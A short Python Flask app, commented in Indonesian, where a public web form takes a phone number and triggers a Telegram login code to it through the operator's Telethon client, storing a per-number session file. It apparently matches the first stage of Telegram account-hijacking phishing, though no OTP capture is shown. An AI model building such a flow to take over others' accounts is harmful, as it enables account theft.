import os
import asyncio
from flask import Flask, request, render_template
from telethon.sync import TelegramClient

app = Flask(__name__)

if not os.path.exists("sessions"):
    os.makedirs("sessions")

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone = request.form.get('phone')
        if phone:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(start_telegram(phone))
        return 'Kode OTP dikirim! Cek Telegram kamu.'
    return render_template('index.html')

async def start_telegram(phone):
    async with TelegramClient(f'sessions/{phone}', API_ID, API_HASH) as client:
        try:
            await client.send_code_request(phone)
        except Exception as e:
            print('Gagal kirim OTP:', e)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
